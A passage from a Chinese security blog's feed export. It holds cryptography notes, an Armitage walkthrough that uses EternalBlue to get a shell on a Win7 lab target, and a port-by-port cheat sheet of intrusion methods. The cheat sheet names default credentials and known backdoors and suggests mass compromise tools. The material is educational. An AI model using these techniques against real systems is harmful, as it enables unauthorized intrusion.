title="散列函数的要求"></a>散列函数的要求</h4><p>散列函数的目的是为文件、消息或其他数据块产生指纹，H函数必须具有以下性质：</p><ul><li>H可适用于任意长度的数据块</li><li>H能生成固定长度的输出</li><li>对于任意x，计算H(x)相对容易，并且可以用软硬件方式实现</li><li>需要具有单向性，或具有抵抗原像攻击性</li><li>对于人一给定数据块x，找到满足H(y)&#x3D;H(x)的y!&#x3D;x在计算上是不可行的，即具有抗弱碰撞攻击性</li><li>找到满足H(y)&#x3D;H(x)的任意一对xy在计算上是不可行的。满足这一特性的散列函数称为抗碰撞性，有时也被称为抗强碰撞性</li></ul><h4 id="散列函数的安全性"><a href="#散列函数的安全性" class="headerlink" title="散列函数的安全性"></a>散列函数的安全性</h4><p>有两种方法可以攻击一个安全的散列函数：密码分析法和蛮力攻击法</p><p>散列函数抵抗蛮力攻击的强度完全依赖于算法生成的散列码的长度。攻击一个长度为n的散列码所需要付出的代价如下：</p><table><thead><tr><th align="center">攻击</th><th align="center">复杂度</th></tr></thead><tbody><tr><td align="center">抗原像</td><td align="center">2^n</td></tr><tr><td align="center">抗第二原像</td><td align="center">2^n</td></tr><tr><td align="center">抗碰撞</td><td align="center">2^(n&#x2F;2)</td></tr></tbody></table><h4 id="简单散列函数"><a href="#简单散列函数" class="headerlink" title="简单散列函数"></a>简单散列函数</h4><p>所有散列函数都按照下面基本原理操作。把输入看成n比特块的序列。对输入用迭代的方式每次处理一块，生成n比特的散列函数。</p><h4 id="SHA安全散列函数"><a href="#SHA安全散列函数" class="headerlink" title="SHA安全散列函数"></a>SHA安全散列函数</h4><p>sha512流程：</p><p><img src="/%5Cimages%5Csha512.png"></p><h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><h4 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h4><p>目标：</p><ul><li>不必修改而直接使用现有的散列函数。特别是很容易免费得到软件上执行速度较快的散列函数及其代码。</li><li>嵌入式散列函数要有很好的可移植性，以便开发更快或更安全的散列函数。</li><li>保持散列函数的原有性能，不发生显著退化。</li><li>使用和处理密钥简单。</li><li>如果已知嵌入的散列函数的强度，则完全可以知道认证机制抗密码分析的强度。</li></ul><h3 id="公钥密码原理"><a href="#公钥密码原理" class="headerlink" title="公钥密码原理"></a>公钥密码原理</h3><h4 id="公钥密码思想"><a href="#公钥密码思想" class="headerlink" title="公钥密码思想"></a>公钥密码思想</h4><p>基本步骤如下：</p><ol><li>每个用户都生成一对密钥用来对消息进行加密和解密。</li><li>每个用户把两个密钥中的一个放在公共寄存器或其他可访问的文件夹里，这个密钥便是公钥，另一个密钥自己保存。</li><li>如果Bob希望给Alice发私人消息，则他用Alice的公钥加密消息。</li><li>当Alice收到这条消息，用私钥解密。因为只有Alice知道她自己的私钥，其他人收到消息无法进行解密</li></ol><h4 id="公钥密码系统的应用"><a href="#公钥密码系统的应用" class="headerlink" title="公钥密码系统的应用"></a>公钥密码系统的应用</h4><ul><li>加密解密</li><li>数字签名：私钥签名，公钥验证</li><li>密钥交换</li></ul><p><img src="/%5Cimages%5Cpubliccrypt.png"></p><h3 id="公钥密码算法"><a href="#公钥密码算法" class="headerlink" title="公钥密码算法"></a>公钥密码算法</h3><h4 id="RSA公钥密码算法"><a href="#RSA公钥密码算法" class="headerlink" title="RSA公钥密码算法"></a>RSA公钥密码算法</h4><p>对一明文块M和密文块C，加密和解密有如下形式：</p><p>C &#x3D; M^e mod n</p><p>M &#x3D; C ^ d mod n &#x3D; M^ed mod n</p><p>设A为明文，B为密文，则：<br> A&#x3D;B^d mod n；<br> B&#x3D;A^e mod n；<br>e和n是公钥，d是私钥。</p><p>n&#x3D;p*q, d&#x3D;e^-1 mod (p-1)(q-1)发送方和接收方都必须知道n和e的值，并且只有接收者知道d的值。RSA公钥密码算法的公钥KU &#x3D; {e,n}，私钥KR &#x3D; {d,n}。为使该算法能够用于公钥加密，它必须满足下列要求：</p><ul><li>可以找到e、d、n的值，是的对所有的M&lt;n,M^ed mod n &#x3D; M成立</li><li>对所有满足M&lt;n的值，计算M^e  C^d 相对容易</li><li>给定e和n，不可能推出d</li></ul><p><img src="/%5Cimages%5Crsasf.png"></p><h4 id="Diffie-Hellman密钥交换"><a href="#Diffie-Hellman密钥交换" class="headerlink" title="Diffie-Hellman密钥交换"></a>Diffie-Hellman密钥交换</h4><p>Diffie-Hellman算法的目的就是使两个用户能够安全的交换密钥，供以后加密消息时使用。该算法本身局限于密钥交换。</p><p><strong>算法：</strong></p><p><img src="/%5Cimages%5Cdhjiaohuan.png"></p><p><strong>可能遭受中间人攻击：</strong></p><p><img src="/%5Cimages%5Cdhattack.png"></p><h4 id="其他公钥密码算法"><a href="#其他公钥密码算法" class="headerlink" title="其他公钥密码算法"></a>其他公钥密码算法</h4><ol><li>数字签名标准DSS：专为数字签名功能而设计的算法。与RSA不同，它不能用来加密或者密钥交换</li><li>椭圆曲线密码ECC：ECC相比于RSA主要吸引力在于它只需要少数比特就可以提供相同强度的安全性，从而减轻了处理开销</li></ol><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>假设Bob想给Alice发送消息。虽然这条消息的保密性并不重要，但是他想Alice能够确定这条消息确实是来自于他。当Alice收到密文时，她发现能够用Bob的公钥进行解密，从而证明这条消息确实是Bob加密的。因为没有其他人拥有Bob的私钥，所以其他任何人都不能创建由Bob的公钥能够解密的密文。因此，整个加密的消息就成为一个数字签名(digital signature)。此外，由于没有Bob的私钥就不可能篡改消息，所以数字签名不仅认证了消息源，它还保证了数据的完整性。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>图形化界面渗透软件：Armitage</title>
    <link href="/blog/2020/05/08/%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E6%B8%97%E9%80%8F%E8%BD%AF%E4%BB%B6%EF%BC%9AArmitage/"/>
    <url>/blog/2020/05/08/%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E6%B8%97%E9%80%8F%E8%BD%AF%E4%BB%B6%EF%BC%9AArmitage/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一款图形化渗透软件Armitage的使用，它拥有友好的可视化图形操作界面、强大的集成环境与自动化的渗透流程，是一款Java写的Metasploit图形界面化的渗透软件。</strong></p><p><img src="/images/fj48.jpg"></p><span id="more"></span><h2 id="打开Armitage"><a href="#打开Armitage" class="headerlink" title="打开Armitage"></a>打开Armitage</h2><p>点击图标即可打开，但是kali2020始终打不开，不知道为什么。直接换命令行sudo armitage即可，直接连接默认配置就好：</p><p><img src="/%5Cimages%5Carmitage.png"></p><p>用Armitage之前先要开启Metasploit相关服务。如果没开的话，在这里直接点击“是”他就会帮你开启</p><p><img src="/%5Cimages%5Carmitage1.png"></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>刚开始还是一片空白，我们需要去扫描内网下的主机。依次选择Hosts-&gt;Nmap Scan-&gt;QuickScan(OS detect)，然后填写内网网段</p><p><img src="/%5Cimages%5Carmitage2.png"></p><p><img src="/%5Cimages%5Carmitage3.png"></p><h2 id="Find-Attacks"><a href="#Find-Attacks" class="headerlink" title="Find Attacks"></a>Find Attacks</h2><p>可以点击主机，services，查看nmap的扫描结果：</p><p><img src="/%5Cimages%5Carmitage4.png"></p><p>如何对靶机进行攻击？依次选择Attacks-&gt;Find Attacks，就可以自动搜索这些设备可能存在漏洞及风险</p><p>如果没有，点击Armitage菜单-Set exploit rank-&gt;poor就可以了</p><p>扫描以后，我们右键靶机，发现菜单中多了一项“Attack”，在“smb”里面列出了一些漏洞名称。请注意，这里列出的漏洞仅是一部分目标主机系统（也就是win7）可能存在的漏洞，并不一定存在，更别说利用了。为了确定这些漏洞的可用性，我们需要检查一下。依次选择192.168.1.110（右键）-&gt;Attack-&gt;smb-&gt;checkexploits，他会自动扫描检查上面所显示的每一个漏洞是否存在及可用。</p><p>当他显示“This module doesnot support check”或者“Cannot reliably check exploitability”类似的结果时（如下图），就证明这个漏洞不存在或无法利用。</p><p>我们在左边依次点开exploit-&gt;windows-&gt;smb,这里列出了一长串漏洞，我们不妨挑一个试试。</p><p>双击“ms17_010_eternalblue”，这里基本不用改什么，只需要确认这里是445端口就行了</p><p><img src="/%5Cimages%5Carmitage5.png"></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>点击launch，发起攻击</p><p>然后发现我们成功发起了攻击，然后点击shell取得win7靶机的shell</p><p><img src="/%5Cimages%5Carmitage6.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见端口及其利用方式</title>
    <link href="/blog/2020/05/06/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
    <url>/blog/2020/05/06/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p><strong>总结一下常见的TCP端口以及这些端口可以利用的点。</strong></p><p><img src="/images/fj47.jpg"></p><span id="more"></span><h2 id="端口利用"><a href="#端口利用" class="headerlink" title="端口利用"></a>端口利用</h2><table><thead><tr><th>端口</th><th>服务</th><th>入侵方式</th></tr></thead><tbody><tr><td>21</td><td>ftp&#x2F;tftp&#x2F;vsftpd文件传输协议</td><td>爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td></tr><tr><td>22</td><td>ssh远程连接</td><td>爆破&#x2F;openssh漏洞</td></tr><tr><td>23</td><td>Telnet远程连接</td><td>爆破&#x2F;嗅探&#x2F;弱口令</td></tr><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS域名解析系统</td><td>域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td></tr><tr><td>67&#x2F;68</td><td>dhcp服务</td><td>劫持&#x2F;欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破&#x2F;嗅探</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破&#x2F;未授权访问&#x2F;远程命令执行</td></tr><tr><td>143</td><td>Imap协议</td><td>爆破</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破&#x2F;搜集目标内网信息</td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入&#x2F;未授权访问&#x2F;弱口令</td></tr><tr><td>445</td><td>smb</td><td>ms17-010&#x2F;端口溢出</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>Linux Rexec服务</td><td>爆破&#x2F;Rlogin登陆</td></tr><tr><td>873</td><td>Rsync服务</td><td>文件上传&#x2F;未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破</td></tr><tr><td>1352</td><td>Lotus domino邮件服务</td><td>爆破&#x2F;信息泄漏</td></tr><tr><td>1433</td><td>mssql</td><td>爆破&#x2F;注入&#x2F;SA弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell</td></tr><tr><td>2049</td><td>Nfs服务</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper服务</td><td>未授权访问</td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破&#x2F;注入</td></tr><tr><td>3389</td><td>Rdp远程桌面链接</td><td>爆破&#x2F;shift后门</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>爆破&#x2F;认证绕过</td></tr><tr><td>5000</td><td>sybase&#x2F;DB2数据库</td><td>爆破&#x2F;注入&#x2F;提权</td></tr><tr><td>5432</td><td>postgresql</td><td>爆破&#x2F;注入&#x2F;缓冲区溢出</td></tr><tr><td>5632</td><td>pcanywhere服务</td><td>抓密码&#x2F;代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破&#x2F;认证绕过</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问&#x2F;爆破</td></tr><tr><td>7001&#x2F;7002</td><td>weblogic</td><td>java反序列化&#x2F;控制台弱口令</td></tr><tr><td>80&#x2F;443</td><td>http&#x2F;https</td><td>web应用漏洞&#x2F;心脏滴血</td></tr><tr><td>8069</td><td>zabbix服务</td><td>远程命令执行&#x2F;注入</td></tr><tr><td>8161</td><td>activemq</td><td>弱口令&#x2F;写文件</td></tr><tr><td>8080&#x2F;8089</td><td>Jboss&#x2F;Tomcat&#x2F;Resin</td><td>爆破&#x2F;PUT文件上传&#x2F;反序列化</td></tr><tr><td>8083&#x2F;8086</td><td>influxDB</td><td>未授权访问</td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td></tr><tr><td>9090</td><td>Websphere控制台</td><td>爆破&#x2F;java反序列化&#x2F;弱口令</td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td></tr><tr><td>27017&#x2F;27018</td><td>mongodb</td><td>未授权访问&#x2F;爆破</td></tr></tbody></table><h3 id="21端口渗透剖析"><a href="#21端口渗透剖析" class="headerlink" title="21端口渗透剖析"></a>21端口渗透剖析</h3><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。<br>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。<br>（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱<br>（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（<a href="https://www.freebuf.com/column/143480.html%EF%BC%89">https://www.freebuf.com/column/143480.html）</a><br>（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。<br>（5）ftp远程代码溢出。（<a href="https://blog.csdn.net/weixin_42214273/article/details/82892282%EF%BC%89%EF%BC%886%EF%BC%89ftp%E8%B7%B3%E8%BD%AC%E6%94%BB%E5%87%BB%E3%80%82%EF%BC%88https://blog.csdn.net/mgxcool/article/details/48249473%EF%BC%89">https://blog.csdn.net/weixin_42214273/article/details/82892282）（6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）</a></p><h3 id="22端口渗透剖析"><a href="#22端口渗透剖析" class="headerlink" title="22端口渗透剖析"></a>22端口渗透剖析</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。<br>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。<br>（2）防火墙SSH后门。（<a href="https://www.secpulse.com/archives/69093.html%EF%BC%89">https://www.secpulse.com/archives/69093.html）</a><br>（3）28退格 OpenSSL<br>（4）openssh 用户枚举 CVE-2018-15473。（<a href="https://www.anquanke.com/post/id/157607%EF%BC%89">https://www.anquanke.com/post/id/157607）</a></p><h3 id="23端口渗透剖析"><a href="#23端口渗透剖析" class="headerlink" title="23端口渗透剖析"></a>23端口渗透剖析</h3><p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。<br>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。<br>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。</p><h3 id="25-x2F-465端口渗透剖析"><a href="#25-x2F-465端口渗透剖析" class="headerlink" title="25&#x2F;465端口渗透剖析"></a>25&#x2F;465端口渗透剖析</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件<br>默认端口：25（smtp）、465（smtps）<br>（1）爆破：弱口令<br>（2）未授权访问</p><h3 id="53端口渗透剖析"><a href="#53端口渗透剖析" class="headerlink" title="53端口渗透剖析"></a>53端口渗透剖析</h3><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。<br>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（<a href="https://www.seebug.org/vuldb/ssvid-96718%EF%BC%89">https://www.seebug.org/vuldb/ssvid-96718）</a><br>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（<a href="https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc%EF%BC%89">https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）</a><br>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<a href="http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml%EF%BC%89%EF%BC%884%EF%BC%89DNS%E5%8A%AB%E6%8C%81%E3%80%82%EF%BC%88https://blog.csdn.net/qq_32447301/article/details/77542474%EF%BC%89">http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）</a></p><h3 id="80端口渗透剖析"><a href="#80端口渗透剖析" class="headerlink" title="80端口渗透剖析"></a>80端口渗透剖析</h3><p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。<br>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。<br>（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。<br>（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。<br>（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。<br>（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。<br>（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。<br>（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。</p><h3 id="135端口渗透剖析"><a href="#135端口渗透剖析" class="headerlink" title="135端口渗透剖析"></a>135端口渗透剖析</h3><p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:<br>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（<a href="https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html%EF%BC%89">https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）</a><br>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（<a href="https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html%EF%BC%89">https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）</a></p><h3 id="139-x2F-445端口渗透剖析"><a href="#139-x2F-445端口渗透剖析" class="headerlink" title="139&#x2F;445端口渗透剖析"></a>139&#x2F;445端口渗透剖析</h3><p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139&#x2F;445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。<br>（1）对于开放139&#x2F;445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（<a href="https://blog.csdn.net/qq_41880069/article/details/82908131%EF%BC%89">https://blog.csdn.net/qq_41880069/article/details/82908131）</a><br>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（<a href="https://blog.csdn.net/god_7z1/article/details/6773652%EF%BC%89">https://blog.csdn.net/god_7z1/article/details/6773652）</a><br>（3）对于开放139&#x2F;445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（<a href="https://blog.warhut.cn/dmbj/145.html%EF%BC%89">https://blog.warhut.cn/dmbj/145.html）</a><br>（4）对于开放139&#x2F;445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p><h3 id="1433端口渗透剖析"><a href="#1433端口渗透剖析" class="headerlink" title="1433端口渗透剖析"></a>1433端口渗透剖析</h3><p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP&#x2F;IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。<br>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（<a href="https://blog.csdn.net/gxj022/article/details/4593015%EF%BC%89">https://blog.csdn.net/gxj022/article/details/4593015）</a><br>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（<a href="https://blog.csdn.net/kali_linux/article/details/50499576%EF%BC%89">https://blog.csdn.net/kali_linux/article/details/50499576）</a><br>（3）嗅探技术同样能嗅探到SQL Server的登录密码。<br>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。</p><h3 id="1521端口渗透剖析"><a href="#1521端口渗透剖析" class="headerlink" title="1521端口渗透剖析"></a>1521端口渗透剖析</h3><p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：<br>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。<br>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</p><p>（3）在注入点直接创建java，执行系统命令。（4）<a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></p><p>以上的端口渗透原理只是用作分析，现在网上有很多自动的端口入侵工具，比如445批量抓鸡器或者1433批量抓鸡器。大家有兴趣的可以去网上下载试用。</p><h3 id="2049端口渗透剖析"><a href="#2049端口渗透剖析" class="headerlink" title="2049端口渗透剖析"></a>2049端口渗透剖析</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。<br>未授权访问。（<a href="https://www.freebuf.com/articles/network/159468.html%EF%BC%89">https://www.freebuf.com/articles/network/159468.html）</a>           (<a href="http://www.secist.com/archives/6192.htm">http://www.secist.com/archives/6192.htm</a>)</p><h3 id="3306端口渗透剖析"><a href="#3306端口渗透剖析" class="headerlink" title="3306端口渗透剖析"></a>3306端口渗透剖析</h3><p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:<br>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。<br>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。<br>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。</p><h3 id="3389端口渗透剖析"><a href="#3389端口渗透剖析" class="headerlink" title="3389端口渗透剖析"></a>3389端口渗透剖析</h3><p>3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。<br>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。<br>（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。<br>（3）Shift粘滞键后门：5次shift后门<br>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（<a href="https://www.cnblogs.com/R-Hacker/p/9178066.html%EF%BC%89%EF%BC%887%EF%BC%89https://www.cnblogs.com/backlion/p/9429738.html">https://www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html</a></p><h3 id="4899端口渗透剖析"><a href="#4899端口渗透剖析" class="headerlink" title="4899端口渗透剖析"></a>4899端口渗透剖析</h3><p>4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP&#x2F;IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：<br>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。<br>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。</p><h3 id="5432端口渗透剖析"><a href="#5432端口渗透剖析" class="headerlink" title="5432端口渗透剖析"></a>5432端口渗透剖析</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。<br>（1）爆破：弱口令：postgres postgres<br>（2）缓冲区溢出：CVE-2014-2669。（<a href="http://drops.xmd5.com/static/drops/tips-6449.html%EF%BC%89%EF%BC%883%EF%BC%89%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%9ACVE-2018-1058%E3%80%82%EF%BC%88https://www.secpulse.com/archives/69153.html%EF%BC%89">http://drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）</a></p><h3 id="5631端口渗透剖析"><a href="#5631端口渗透剖析" class="headerlink" title="5631端口渗透剖析"></a>5631端口渗透剖析</h3><p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。<br>PcAnyWhere提权。（<a href="https://blog.csdn.net/Fly_hps/article/details/80377199%EF%BC%89">https://blog.csdn.net/Fly_hps/article/details/80377199）</a></p><h3 id="5900端口渗透剖析"><a href="#5900端口渗透剖析" class="headerlink" 